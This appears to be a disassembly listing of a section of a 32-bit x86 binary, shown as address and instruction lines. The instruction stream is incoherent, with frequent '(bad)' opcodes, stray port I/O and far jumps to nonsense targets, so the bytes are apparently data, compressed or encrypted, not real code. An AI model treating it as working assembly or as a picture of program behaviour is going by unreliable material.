  4147c7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4147c8:	mov    ch,0xd6
  4147ca:	dec    ecx
  4147cb:	ins    BYTE PTR es:[edi],dx
  4147cc:	jl     0x4147d0
  4147ce:	icebp  
  4147cf:	pop    esp
  4147d0:	and    DWORD PTR [edi+0x47c0bcd],edi
  4147d6:	hlt    
  4147d7:	popf   
  4147d8:	loop   0x4147ec
  4147da:	out    dx,al
  4147db:	mov    DWORD PTR [edi],esi
  4147dd:	loopne 0x414800
  4147df:	cmp    eax,0xc9796c3f
  4147e4:	push   ecx
  4147e5:	in     al,dx
  4147e6:	lods   eax,DWORD PTR ds:[esi]
  4147e7:	inc    ecx
  4147e8:	pop    eax
  4147e9:	and    al,0x95
  4147eb:	cmp    edx,eax
  4147ed:	retf   
  4147ee:	es aas 
  4147f0:	imul   ebx,ecx,0x3b
  4147f3:	jl     0x41477d
  4147f5:	cmp    bh,BYTE PTR [ebp+0x9]
  4147f8:	call   0xbf282cad
  4147fd:	call   0x8cb6:0xcb64d3a6
  414804:	xor    edx,esi
  414806:	adc    cl,bh
  414808:	adc    esp,ebp
  41480a:	imul   edx,DWORD PTR [esi],0xb7cb4915
  414810:	test   DWORD PTR ds:0x354946db,0x7fec5ad6
  41481a:	xchg   edi,eax
  41481b:	jnp    0x414879
  41481d:	sub    BYTE PTR [ebp+0x7b4612de],bh
  414823:	loop   0x4147ce
  414825:	jle    0x414809
  414827:	or     bl,al
  414829:	cmp    al,0x21
  41482b:	pop    eax
  41482c:	add    al,0x1e
  41482e:	test   eax,0xbba03faf
  414833:	(bad)  [ebp-0x23]
  414836:	mul    DWORD PTR [edx+ebx*8-0x21]
  41483a:	or     al,0xa1
  41483c:	or     eax,0xbe989c36
  414841:	cmp    BYTE PTR [edx],al
  414843:	test   DWORD PTR [eax-0x2fab6a5],ebx
  414849:	adc    eax,0x99950a9d
  41484e:	sub    esp,ebp
  414850:	cmp    esp,DWORD PTR ds:0x9c97fa5
  414856:	mov    ebx,0xc094626f
  41485b:	popf   
  41485c:	shr    DWORD PTR [edi+edx*1],1
  41485f:	call   0xe4550365
  414864:	dec    ecx
  414865:	xor    DWORD PTR [esi+0x38],edi
  414868:	(bad)  
  41486a:	stos   BYTE PTR es:[edi],al
  41486b:	sub    eax,ecx
  41486d:	in     al,0x18
  41486f:	ret    
  414870:	jmp    0x79cc3414
  414875:	fs push esp
  414877:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414878:	inc    edi
  414879:	mov    ebp,0x5a16365f
  41487e:	cli    
  41487f:	adc    al,BYTE PTR [esi+0x5cdf55f]
  414885:	retf   
  414886:	shr    BYTE PTR ss:[edx+0x1a9e22af],1
  41488d:	in     eax,dx
  41488e:	frstor [ecx+0x4e98175c]
  414894:	pop    esi
  414895:	test   eax,0xaa863536
  41489a:	lods   al,BYTE PTR ds:[esi]
  41489b:	inc    esp
  41489c:	sahf   
  41489d:	ins    BYTE PTR es:[edi],dx
  41489e:	jecxz  0x41482e
  4148a0:	add    ebp,DWORD PTR [ebx]
  4148a2:	mov    BYTE PTR [esi+0x1eba611e],ah
  4148a8:	lea    ebp,[ebp+0x2e]
  4148ab:	xchg   DWORD PTR [ecx],ecx
  4148ad:	xchg   ebx,eax
  4148ae:	in     al,0xad
  4148b0:	stos   DWORD PTR es:[edi],eax
  4148b1:	xor    bl,BYTE PTR [ebx-0x117b75a6]
  4148b7:	mov    edx,0x1b360d80
  4148bc:	daa    
  4148bd:	mov    al,ds:0x619a0f3f
  4148c2:	xor    eax,0x4d05c587
  4148c7:	retf   
  4148c8:	pop    esp
  4148c9:	mov    cl,0xfb
  4148cb:	adc    al,0xfc
  4148cd:	and    cl,bh
  4148cf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4148d0:	lods   al,BYTE PTR ds:[esi]
  4148d1:	data16 loopne 0x414880
  4148d4:	aam    0x94
  4148d6:	sub    eax,0x2c6d9870
  4148db:	inc    esi
  4148dc:	mov    esi,0x776709e5
  4148e1:	neg    DWORD PTR [esi]
  4148e3:	rcr    bl,0x7f
  4148e6:	daa    
  4148e7:	add    al,BYTE PTR [ecx-0x7c7df0ed]
  4148ed:	(bad)  
  4148ee:	(bad)  
  4148f0:	addr16 sub al,0x95
  4148f3:	enter  0xdca5,0x4d
  4148f7:	test   esi,ebp
  4148f9:	je     0x41489d
  4148fb:	pop    edi
  4148fc:	jmp    0x17:0x17c2322a
  414903:	aas    
  414904:	(bad)  
  414905:	mov    cl,0x7
  414907:	inc    ebx
  414908:	std    
  414909:	mov    edi,gs
  41490b:	mov    ds:0x75493482,al
  414910:	jb     0x4148db
  414912:	push   ebx
  414913:	mov    cl,0x93
  414915:	add    esi,DWORD PTR ds:[eax+0x1d9487d1]
  41491c:	in     al,dx
  41491d:	rcl    DWORD PTR [edx],1
  41491f:	loop   0x4148bc
  414921:	mov    dh,0xda
  414923:	push   DWORD PTR [eax-0x7c]
  414926:	push   ecx
  414927:	mov    bl,0x16
  414929:	leave  
  41492a:	cmp    dl,BYTE PTR [esi-0x7c1ce063]
  414930:	pop    edi
  414931:	cmp    eax,0x40b69d3a
  414936:	mov    al,ds:0x38557220
  41493b:	dec    ebx
  41493c:	xchg   ecx,eax
  41493d:	out    dx,eax
  41493e:	push   eax
  41493f:	je     0x4149b9
  414941:	push   ecx
  414942:	aad    0x76
  414944:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414945:	cmp    bl,BYTE PTR [esi]
  414947:	gs xchg esp,eax
  414949:	push   DWORD PTR ds:0x33aa0845
  41494f:	pushf  
  414950:	sar    edi,cl
  414952:	and    DWORD PTR [ebx-0x530e4407],0xea458a9d
  41495c:	pushf  
  41495d:	call   0x9c439449
  414962:	xor    cl,BYTE PTR [edx]
  414964:	lahf   
  414965:	mov    eax,ds:0x56300237
  41496a:	adc    al,0xb2
  41496c:	push   esi
  41496d:	jb     0x41496d
  41496f:	scas   eax,DWORD PTR es:[edi]
  414970:	retf   0xf6b8
  414973:	rol    bh,0xa0
  414976:	mov    DWORD PTR [ebx+0xa945e2e],ebp
  41497c:	into   
  41497d:	mov    ah,cl
  41497f:	retf   
  414980:	ss sub al,0xd3
  414983:	mov    eax,DWORD PTR [edx+0x3923b532]
  414989:	jp     0x414964
  41498b:	cs jnp 0x414a0b
  41498e:	push   cs
  41498f:	dec    eax
  414990:	and    al,0x46
  414992:	cmp    ebp,DWORD PTR [esi]
  414994:	fld    QWORD PTR [esp+ebx*8-0x47]
  414998:	gs inc esi
  41499a:	rcr    BYTE PTR ds:0x88befc4b,1
  4149a0:	xor    BYTE PTR [edx+0x26],0x7b
  4149a4:	fs jp  0x4149aa
  4149a7:	(bad)  
  4149a8:	xchg   ebp,eax
  4149a9:	xor    ebx,ebx
  4149ab:	jge    0x414a0d
  4149ad:	test   BYTE PTR [esi],bl
  4149af:	loope  0x414970
  4149b1:	jge    0x4149d6
  4149b3:	and    edx,DWORD PTR [ebp+0x4c]
  4149b6:	mov    dh,0x93
  4149b8:	out    0xcf,al
  4149ba:	xchg   edx,eax
  4149bb:	sahf   
  4149bc:	mov    dl,0x33
  4149be:	(bad)  
  4149bf:	sbb    DWORD PTR [ecx],ecx
  4149c1:	scas   eax,DWORD PTR es:[edi]
  4149c2:	stos   DWORD PTR es:[edi],eax
  4149c3:	jnp    0x414995
  4149c5:	xlat   BYTE PTR ds:[ebx]
  4149c6:	cmp    DWORD PTR gs:[ebp-0x4c],edx
  4149ca:	(bad)  
  4149cb:	loopne 0x414998
  4149cd:	dec    esi
  4149ce:	pusha  
  4149cf:	jns    0x4149f3
  4149d1:	adc    bh,BYTE PTR [edx]
  4149d3:	sub    esi,edi
  4149d5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4149d6:	jl     0x414a47
  4149d8:	popa   
  4149d9:	out    dx,al
  4149da:	pusha  
  4149db:	sub    al,0xb2
  4149dd:	es fwait
  4149df:	xor    esi,DWORD PTR [ecx+0x23]
  4149e2:	enter  0x14b4,0xda
  4149e6:	repz inc ebp
  4149e8:	fisub  WORD PTR [ebx]
  4149ea:	dec    ebx
  4149eb:	rcl    BYTE PTR [edx+0x4e],cl
  4149ee:	int    0xdd
  4149f0:	cwde   
  4149f1:	add    ebx,edi
  4149f3:	ja     0x414a08
  4149f5:	jno    0x414a4c
  4149f7:	(bad)  
  4149f8:	jne    0x41498b
  4149fa:	test   al,0x96
  4149fc:	push   cs
  4149fd:	call   0x1699:0x46107c16
  414a04:	and    ebx,DWORD PTR [esp+ebp*1+0x35]
  414a08:	imul   DWORD PTR [esi+0x57143da9]
  414a0e:	add    ebp,DWORD PTR [esi+0x7122c80d]
  414a14:	(bad)
  414a17:	xchg   ecx,eax
  414a18:	enter  0x9a7c,0x38
  414a1c:	xor    DWORD PTR [edx-0x23],0x66
  414a20:	fistp  DWORD PTR [eax+0x6b656f11]
  414a26:	xor    al,0x7a
  414a28:	fisub  DWORD PTR [eax-0x779d2bb3]
  414a2e:	pop    esi
  414a2f:	aam    0xbe
  414a31:	(bad)  
  414a32:	daa    
  414a33:	cs mov eax,0xe6362ddd
  414a39:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414a3a:	dec    eax
  414a3b:	stc    
  414a3c:	adc    bh,cl
  414a3e:	sbb    esp,0xa69d8537
  414a44:	pushf  
  414a45:	call   0x9557:0xb91c63e2
  414a4c:	pop    edi
  414a4d:	std    
  414a4e:	retf   
  414a4f:	neg    DWORD PTR [ebp+0x11]
  414a52:	imul   edi,DWORD PTR [eax+0x7a],0xffffffc3
  414a56:	call   0x537b9fbe
  414a5b:	dec    esp
  414a5c:	cwde   
  414a5d:	adc    al,BYTE PTR [edx-0x539e5316]
  414a63:	cmp    BYTE PTR [edx+0x52eadf77],dh
  414a69:	cdq    
  414a6a:	ja     0x414a13
  414a6c:	pop    ds
  414a6d:	mov    ebp,DWORD PTR es:[eax+eiz*1-0x547be793]
  414a75:	inc    ebx
  414a76:	jle    0x414a69
  414a78:	mov    cl,0x3f
  414a7a:	cld    
  414a7b:	pop    edx
  414a7c:	jp     0x414a7f
  414a7e:	fdiv   QWORD PTR ds:0xe4e662d
  414a84:	xchg   ebx,eax
  414a85:	mov    ebp,0xa81af76e
  414a8a:	mov    ah,0x83
  414a8c:	or     esp,DWORD PTR [ebp-0x3c]
  414a8f:	enter  0xb3b1,0x47
  414a93:	xchg   edi,eax
  414a94:	jae    0x414af2
  414a96:	clc    
  414a97:	call   0x90462146
  414a9c:	pop    esi
  414a9d:	scas   eax,DWORD PTR es:[edi]
  414a9e:	add    dl,ah
  414aa0:	cld    
  414aa1:	nop
  414aa2:	push   ss
  414aa3:	faddp  st(6),st
  414aa5:	cli    
  414aa6:	cmp    bl,BYTE PTR [ecx+eiz*1+0x73560b67]
  414aad:	xchg   edi,eax
  414aae:	add    al,0xe6
  414ab0:	pusha  
  414ab1:	sbb    esp,DWORD PTR [ecx+0xf6aec87]
  414ab7:	lock fcomp DWORD PTR [edx-0xd]
  414abb:	in     al,dx
  414abc:	jge    0x414a47
  414abe:	je     0x414acc
  414ac0:	dec    ebx
  414ac1:	cmp    bl,BYTE PTR [ebx]
  414ac3:	mov    bh,0x46
  414ac5:	gs jle 0x414a6f
  414ac8:	inc    eax
  414ac9:	jg     0x414a88
  414acb:	adc    al,0x2a
  414acd:	repnz adc al,0x9f
  414ad0:	push   0xffffff8e
  414ad2:	rol    DWORD PTR [ebx+ecx*1],0x7f
  414ad6:	mov    ecx,DWORD PTR [ecx+0x2357b4f8]
  414adc:	or     al,0x4c
  414ade:	lahf   
  414adf:	cmp    BYTE PTR [eax+0x37],ch
  414ae2:	jecxz  0x414b2b
  414ae4:	dec    bx
  414ae6:	xchg   DWORD PTR [esi],esp
  414ae8:	pop    esi
  414ae9:	xchg   esi,eax
  414aea:	mov    ds:0xb1d89336,al
  414aef:	loopne 0x414b57
  414af1:	(bad)  
  414af3:	jne    0x414b3d
  414af5:	xchg   BYTE PTR [ecx-0x5],al
  414af8:	mov    al,0xa6
  414afa:	test   eax,0x1ba2ca12
  414aff:	in     eax,dx
  414b00:	std    
  414b01:	dec    edi
  414b02:	xor    al,0xad
  414b04:	xor    DWORD PTR [edi-0x79],ecx
  414b07:	add    dh,cl
  414b09:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414b0a:	dec    edi
  414b0b:	idiv   edx
  414b0d:	cmp    dh,BYTE PTR [eax]
  414b0f:	add    dh,BYTE PTR fs:[edx-0xb5ca134]
  414b16:	xchg   BYTE PTR [edx],bh
  414b18:	pop    ebp
  414b19:	mov    DWORD PTR [esi+0x1d0a15f6],edi
  414b1f:	js     0x414abf
  414b21:	lahf   
  414b22:	or     edi,DWORD PTR [edi+edx*8-0x3784cee7]
  414b29:	sub    DWORD PTR [ecx+0x38d1660e],eax
  414b2f:	jbe    0x414b35
  414b31:	ins    DWORD PTR es:[edi],dx
  414b32:	push   ebp
  414b33:	cli    
  414b34:	cdq    
  414b35:	data16 in al,0x80
  414b38:	(bad)  
  414b39:	jmp    0x414ae4
  414b3b:	dec    eax
  414b3c:	lea    edx,[esp+eiz*8+0x18]
  414b40:	or     al,BYTE PTR [edx+0x270de444]
  414b46:	and    BYTE PTR [ebx-0x26],0x13
  414b4a:	cmp    edx,DWORD PTR [eax]
  414b4c:	mov    ch,BYTE PTR [edi]
  414b4e:	push   ebx
  414b4f:	jo     0x414b69
  414b51:	push   ss
  414b52:	retf   
  414b53:	add    al,0xd6
  414b55:	add    eax,0xf91a2fe
  414b5a:	cdq    
  414b5b:	imul   edi,DWORD PTR [esi+eax*1+0x10],0xffffffe9
  414b60:	arpl   WORD PTR [ebx+0x73],bx
  414b63:	cmp    eax,DWORD PTR [ebx]
  414b65:	and    dh,0x0
  414b68:	push   eax
  414b69:	pop    esp
  414b6a:	xor    eax,0x11e42ffc
  414b6f:	cmp    DWORD PTR [ecx],ebx
  414b71:	mov    ah,0xb5
  414b73:	mov    dh,0x21
  414b76:	inc    edi
  414b77:	or     DWORD PTR [edx-0x1654eb9a],0x5c3f52cb
  414b81:	sbb    eax,0x6bf35dab
  414b86:	inc    edx
  414b87:	enter  0x7115,0xf4
  414b8b:	rol    BYTE PTR [edx+edi*1],cl
  414b8e:	jmp    FWORD PTR [esp+ebx*2]
  414b91:	push   esp
  414b92:	loop   0x414b7b
  414b94:	push   0x48
  414b96:	fs stos BYTE PTR es:[edi],al
  414b98:	gs fs sub dl,ah
  414b9c:	loop   0x414c0d
  414b9e:	adc    edi,DWORD PTR [edi+0x35]
  414ba1:	retf   0x1e2a
  414ba4:	pop    ebx
  414ba5:	repnz push edx
  414ba7:	jne    0x414bce
  414ba9:	inc    esi
  414baa:	leave  
  414bab:	ret    
  414bac:	xor    eax,0xb7f194b1
  414bb1:	popfw  
  414bb3:	cdq    
  414bb4:	ins    DWORD PTR es:[edi],dx
  414bb5:	mov    al,0x90
  414bb7:	xchg   esi,eax
  414bb8:	ds aas 
  414bba:	jns    0x414c26
  414bbc:	loop   0x414b3f
  414bbe:	rcl    DWORD PTR [edx],1
  414bc0:	loopne 0x414c38
  414bc2:	fmul   DWORD PTR [esi+0x14]
  414bc5:	pop    edx
  414bc6:	mov    WORD PTR [eax-0x40],gs
  414bc9:	jge    0x414bbd
  414bcb:	or     dh,0xb9
  414bce:	fdiv   QWORD PTR [ecx+eiz*8-0x5a]
  414bd2:	in     eax,dx
  414bd3:	lock inc esi
  414bd5:	adc    eax,DWORD PTR [ecx]
  414bd7:	aad    0x66
  414bd9:	add    DWORD PTR [edx],ebx
  414bdb:	(bad)  
  414bdc:	repz ficom DWORD PTR [ecx+ebp*8]
  414be0:	lods   eax,DWORD PTR ds:[esi]
  414be1:	inc    ebx
  414be2:	pop    esi
  414be3:	mov    ds:0xbc5fa8df,al
  414be8:	dec    esp
  414be9:	aam    0xe1
  414beb:	jae    0x414b98
  414bed:	mov    ebx,0xf70ce9d6
  414bf2:	jl     0x414bd4
  414bf4:	sub    eax,DWORD PTR [eax]
  414bf6:	sub    ah,BYTE PTR [eax-0x2ff27d6]
  414bfc:	mov    ecx,0xfbf73fdc
  414c01:	xor    DWORD PTR [ecx],ecx
  414c03:	xlat   BYTE PTR ds:[ebx]
  414c04:	push   0xffffffe4
  414c06:	adc    BYTE PTR [ebx-0x10],ch
  414c09:	div    DWORD PTR [eax]
  414c0b:	inc    ebx
  414c0c:	or     edi,edi
  414c0e:	jecxz  0x414c51
  414c10:	sub    eax,0xfb17a7f3
  414c15:	inc    eax
  414c16:	cwde   
  414c17:	mov    al,0x1b
  414c19:	ret    0xc25f
  414c1c:	test   BYTE PTR [eax+0x43],0x1e
  414c20:	sbb    al,0x48
  414c22:	or     BYTE PTR [edi],cl
  414c24:	test   al,0x19
  414c26:	or     al,0x98
  414c28:	aaa    
  414c29:	test   ebp,eax
  414c2b:	shl    DWORD PTR [esp+ecx*4],1
  414c2e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414c2f:	sbb    edx,DWORD PTR [ebx-0x11ceac00]
  414c35:	adc    bh,BYTE PTR [edx+ecx*4]
  414c38:	add    ebp,ebp
  414c3a:	call   0x59763003
  414c3f:	retf   0x1081
  414c42:	out    0x50,al
  414c44:	(bad)  
  414c45:	lds    edi,FWORD PTR [ebx+0x22]
  414c48:	mov    bh,0xb6
  414c4a:	pop    es
  414c4b:	aam    0x74
  414c4d:	inc    edi
  414c4e:	pop    esi
  414c4f:	dec    BYTE PTR [ecx+eax*2+0xa84ff1c]
  414c56:	mov    ebp,0x458b039d
  414c5b:	jge    0x414ccf
  414c5d:	daa    
  414c5e:	and    eax,0xf7d92596
  414c63:	leave  
  414c64:	pushf  
  414c65:	dec    edx
  414c66:	jmp    0x414c2d
  414c68:	je     0x414c01
  414c6a:	push   edi
  414c6b:	in     al,0x71
  414c6d:	inc    edx
  414c6e:	and    edi,edx
  414c70:	adc    eax,DWORD PTR [esi-0x80]
  414c73:	out    0x92,al
  414c75:	cmc    
  414c76:	push   eax
  414c77:	shl    DWORD PTR [eax-0x18],0x10
  414c7b:	retf   
  414c7c:	add    eax,0x151ab056
  414c81:	jno    0x414cde
  414c83:	ret    
  414c84:	aad    0xf3
  414c86:	pop    edx
  414c87:	jmp    0xc7da:0x5e62260c
  414c8e:	out    0xdd,al
  414c90:	mov    edx,0x7c22d5d5
  414c95:	dec    eax
  414c96:	ins    BYTE PTR es:[edi],dx
  414c97:	and    al,0x5e
  414c99:	(bad)  
  414c9a:	jbe    0x414ca0
  414c9c:	aaa    
  414c9d:	mov    edi,0x3ab4d6f4
  414ca2:	sub    DWORD PTR [eax+0x78],0xb943809b
  414ca9:	jno    0x414d28
  414cab:	inc    eax
  414cac:	iret   
  414cad:	jg     0x414c50
  414caf:	xor    eax,0xcc3cff5a
  414cb4:	dec    esi
  414cb5:	fiadd  DWORD PTR [eax-0x582f536c]
  414cbb:	jmp    0x6e2740ef
  414cc0:	and    eax,0x58dce709
  414cc5:	add    cl,dh
  414cc7:	scas   eax,DWORD PTR es:[edi]
  414cc8:	xlat   BYTE PTR ds:[ebx]
  414cc9:	push   es
  414cca:	loopne 0x414c94
  414ccc:	loope  0x414ce5
  414cce:	jb     0x414c5e
  414cd0:	dec    edi
  414cd1:	cld    
  414cd2:	xchg   edi,eax
  414cd3:	jmp    0x414d4d
  414cd5:	scas   eax,DWORD PTR es:[edi]
  414cd6:	cmp    al,BYTE PTR [edi]
  414cd8:	(bad)  
  414cd9:	lock mov bl,0xa5
  414cdc:	xchg   esi,eax
  414cdd:	or     edx,eax
  414cdf:	rcl    ah,cl
  414ce1:	inc    edi
  414ce2:	mov    bh,0xfe
  414ce4:	fidiv  WORD PTR [ecx]
  414ce6:	sub    DWORD PTR [esi-0x29656ee4],esp
  414cec:	fimul  WORD PTR [edx-0x38dd0dec]
  414cf2:	jne    0x414cd0
  414cf4:	ss jnp 0x414d52
  414cf7:	inc    esp
  414cf8:	inc    esp
  414cf9:	mov    ecx,0x87348f3d
  414cfe:	sub    ebx,esi
  414d00:	bound  ebp,QWORD PTR [edx+0x545e421e]
  414d06:	fs (bad) 
  414d08:	mov    edx,0xa8d21afb
  414d0d:	imul   ecx,DWORD PTR [edi],0x39
  414d10:	cmp    edx,edi
  414d12:	push   ecx
  414d13:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414d14:	in     eax,0x7a
  414d16:	adc    al,0x6d
  414d18:	ror    BYTE PTR [bx],cl
  414d1b:	sub    cl,BYTE PTR [eax+0x697c61ce]
  414d21:	cmp    BYTE PTR [esp+ebx*2-0x3af43908],dh
  414d28:	test   DWORD PTR [eax],esp
  414d2a:	ret    0xd052
  414d2d:	shl    DWORD PTR [esi-0x74],1
  414d30:	inc    ebp
  414d31:	xor    eax,0x5e3fd550
  414d36:	mov    ch,0x13
  414d38:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414d39:	aaa    
  414d3a:	sub    BYTE PTR [edx-0x4bbc1651],0x67
  414d41:	sub    eax,0x9925bace
  414d46:	or     cl,ch
  414d48:	xor    BYTE PTR ds:0xe6103037,bh
  414d4e:	sahf   
  414d4f:	fimul  DWORD PTR [esi-0x69]
  414d52:	ss jmp 0x414d1d
  414d55:	push   0x933b2edd
  414d5a:	aas    
  414d5b:	sub    BYTE PTR [edx],bl
  414d5d:	xlat   BYTE PTR ds:[ebx]
  414d5e:	pusha  
  414d5f:	loope  0x414d8d
  414d61:	mov    esi,0xabd3c1c1
  414d66:	add    ebp,DWORD PTR [ecx]
  414d68:	lock scas al,BYTE PTR es:[edi]
  414d6a:	or     ah,BYTE PTR [ecx+edx*2-0x127a9158]
  414d71:	(bad)  
  414d73:	or     ah,BYTE PTR [esi+0x4551ac55]
  414d79:	cld    
  414d7a:	pop    ebp
  414d7b:	pop    ebp
  414d7c:	enter  0x33be,0x87
  414d80:	mov    ebx,0x272ac136
  414d85:	sbb    al,0x74
  414d87:	dec    eax
  414d88:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414d89:	(bad)  
  414d8a:	xlat   BYTE PTR ds:[ebx]
  414d8b:	test   BYTE PTR [eax+0x54],0xbf
  414d8f:	les    edx,FWORD PTR [ebx]
  414d91:	mov    ah,ah
  414d93:	mov    eax,ds:0xb7a2743a
  414d98:	jle    0x414e19
  414d9a:	cmp    edi,eax
  414d9c:	fdivr  QWORD PTR [edi]
  414d9e:	xchg   ebp,eax
  414d9f:	sub    eax,0x8cf5f7b0
  414da4:	sbb    DWORD PTR [edi+ebx*8+0x5c6013ba],esp
  414dab:	sbb    ebx,DWORD PTR [edx]
  414dad:	or     eax,0x9e25fd5e
  414db2:	push   es
  414db3:	and    DWORD PTR [edi-0x20],esp
  414db6:	into   
  414db7:	outs   dx,BYTE PTR ds:[esi]
  414db8:	les    esi,FWORD PTR [ebx+0x5c41a91c]
  414dbe:	fst    QWORD PTR [edi]
  414dc0:	xchg   edx,eax
  414dc1:	sub    dl,BYTE PTR [edx+ecx*2-0x33]
  414dc5:	fild   DWORD PTR [edx+0x24]
  414dc8:	inc    esi
  414dc9:	es in  eax,dx
  414dcb:	shl    BYTE PTR [esi+ecx*8+0x2ad63cab],cl
  414dd2:	cmp    eax,0xb573b61b
  414dd7:	out    dx,al
  414dd8:	jmp    FWORD PTR [esi+ecx*4+0x3cf8e29a]
  414ddf:	jge    0x414df8
  414de1:	je     0x414e10
  414de3:	mov    eax,0x2ec6a275
  414de8:	add    DWORD PTR [ecx-0x2cbf7f59],edx
  414dee:	sbb    BYTE PTR [eax],dl
  414df0:	shl    al,cl
  414df2:	sbb    ecx,DWORD PTR [edx]
  414df4:	fbstp  TBYTE PTR [ebp+0x1641acd8]
  414dfa:	icebp  
  414dfb:	adc    ch,0x37
  414dfe:	mov    WORD PTR fs:[ebp-0x6c],?
  414e02:	xchg   ebx,eax
  414e03:	in     al,dx
  414e04:	mov    ch,0xf6
  414e06:	je     0x414e03
  414e08:	sbb    esi,esi
  414e0a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414e0b:	nop
  414e0c:	sti    
  414e0d:	push   ecx
  414e0e:	jg     0x414e3e
  414e10:	add    al,0x5c
  414e12:	xor    DWORD PTR [edi+ebp*8],0xffffff9f
  414e16:	rol    BYTE PTR [edx+0x21d49814],0xfd
  414e1d:	jae    0x414e09
  414e1f:	rcr    edx,cl
  414e21:	xor    al,0xd0
  414e23:	(bad)  
  414e24:	outs   dx,DWORD PTR ds:[esi]
  414e25:	sub    DWORD PTR [edx+0x735694f4],edi
  414e2b:	fwait
  414e2c:	adc    BYTE PTR [edi+0x2033efd6],cl
  414e32:	test   al,0xfa
  414e34:	data16 div BYTE PTR [edx]
  414e37:	mov    bh,0x9b
  414e39:	jnp    0x414e3d
  414e3b:	xchg   edi,eax
  414e3c:	or     ebp,DWORD PTR [edx+eax*2-0x4f]
  414e40:	out    dx,al
  414e41:	mov    dl,0x4b
  414e43:	inc    esi
  414e44:	jo     0x414e1d
  414e46:	jb     0x414ebe
  414e48:	fnstenv [ecx+0x25]
  414e4b:	adc    eax,0x495fc743
  414e50:	push   esp
  414e51:	pop    edi
  414e53:	xor    BYTE PTR [ecx-0x66357b1c],dl
  414e59:	mov    dh,0x45
  414e5b:	adc    ah,dh
  414e5d:	and    BYTE PTR [edx],ah
  414e5f:	xchg   edx,eax
  414e60:	jmp    0x54ad:0x676b57e7
  414e67:	fdivr  DWORD PTR [ecx]
  414e69:	fidivr DWORD PTR [esi]
  414e6b:	bound  eax,QWORD PTR [ecx-0x2d]
  414e6e:	cmp    DWORD PTR [eax+eiz*4+0x61e0a881],edx
  414e75:	adc    al,0x29
  414e77:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414e78:	fidivr DWORD PTR [esi]
  414e7a:	loope  0x414e47
  414e7c:	push   eax
  414e7d:	aam    0x1d
  414e7f:	jmp    0xf4534e64
  414e84:	inc    edi
  414e85:	sub    BYTE PTR [eax+esi*8],ah
  414e88:	pop    esp
  414e89:	lods   eax,DWORD PTR ds:[esi]
  414e8a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414e8b:	sub    ebx,DWORD PTR [esi-0x717dc206]
  414e91:	mov    ebx,0x7e0c4590
  414e96:	out    dx,eax
  414e97:	popf   
  414e98:	push   edx
  414e99:	test   DWORD PTR [ecx],esp
  414e9b:	push   ebp
  414e9c:	ror    DWORD PTR [ebx+0x7c],cl
  414e9f:	cmp    DWORD PTR [esi+0x33],ebx
  414ea2:	xor    DWORD PTR [bp+di+0x5e],0xffffffff
  414ea7:	jne    0x414ed8
  414ea9:	and    ecx,DWORD PTR [esi+0x5f15f186]
  414eaf:	test   DWORD PTR [ebp+0x33],ebp
  414eb2:	mov    cs,WORD PTR [esi+0x5f]
  414eb5:	cmp    esi,ebx
  414eb7:	inc    esi
  414eb8:	imul   ebp,DWORD PTR [ebp+0x15],0xffffffdc
  414ebc:	test   BYTE PTR [eax],al
  414ebe:	test   eax,0xaf7ae647
  414ec3:	shl    BYTE PTR [edx],0x8f
  414ec6:	mov    edx,0x9f299336
  414ecb:	je     0x414ece
  414ecd:	sbb    eax,0x9af2d232
  414ed2:	pop    es
  414ed3:	mov    ebp,0xdca8a109
  414ed8:	repz std 
  414eda:	or     al,0x84
  414edc:	test   BYTE PTR [edi],bh
  414ede:	bound  ecx,QWORD PTR [ecx]
  414ee0:	inc    ebp
  414ee1:	aam    0x4d
  414ee3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414ee4:	add    DWORD PTR [ebp-0x40],esi
  414ee7:	pop    esp
  414ee8:	push   edi
  414ee9:	mov    eax,ds:0x9754200e
  414eee:	sbb    DWORD PTR [ebp-0x75],eax
  414ef1:	shr    DWORD PTR [eax-0x6b6308f2],0xad
  414ef8:	or     dh,dh
  414efa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414efb:	psrlq  mm4,mm5
  414efe:	sub    ah,BYTE PTR [ebx]
  414f00:	pop    ss
  414f01:	das    
  414f02:	loope  0x414eb3
  414f04:	pop    es
  414f05:	xchg   edi,eax
  414f06:	aas    
  414f07:	mov    ch,0xb9
  414f09:	iret   
  414f0a:	mov    eax,0xd54d667e
  414f0f:	ja     0x414f36
  414f11:	mov    cl,0x59
  414f13:	dec    esp
  414f14:	push   ebp
  414f15:	or     eax,eax
  414f17:	imul   ecx,DWORD PTR [edi-0x62],0x92950b81
  414f1e:	xchg   al,ah
  414f20:	outs   dx,DWORD PTR ds:[esi]
  414f21:	dec    BYTE PTR [esi]
  414f23:	xchg   edx,eax
  414f24:	(bad)  
  414f25:	cmp    bl,cl
  414f27:	and    eax,0x23855c3c
  414f2c:	in     al,0xd3
  414f2e:	and    eax,0xe77a9bde
  414f33:	cmp    ecx,eax
  414f35:	pop    edi
  414f36:	adc    ebx,DWORD PTR [ebx]
  414f38:	loope  0x414f92
  414f3a:	ins    BYTE PTR es:[edi],dx
  414f3b:	test   BYTE PTR ds:0x6fa702cc,ah
  414f41:	das    
  414f42:	mov    cl,0xac
  414f44:	cmp    DWORD PTR [esi-0x53],esi
  414f47:	push   es
  414f48:	aam    0x34
  414f4a:	sub    al,BYTE PTR cs:[ebp-0x6c63412c]
  414f51:	(bad)  
  414f52:	pusha  
  414f53:	cmp    DWORD PTR es:[eax],edi
  414f56:	cli    
  414f57:	push   eax
  414f58:	mov    bl,0x9a
  414f5a:	div    eax
  414f5c:	add    BYTE PTR [esi+0x4],0x37
  414f60:	lods   al,BYTE PTR ds:[esi]
  414f61:	xchg   esi,eax
  414f62:	sbb    DWORD PTR [ebp+0x68],0x6d
  414f66:	(bad)  
  414f68:	inc    edi
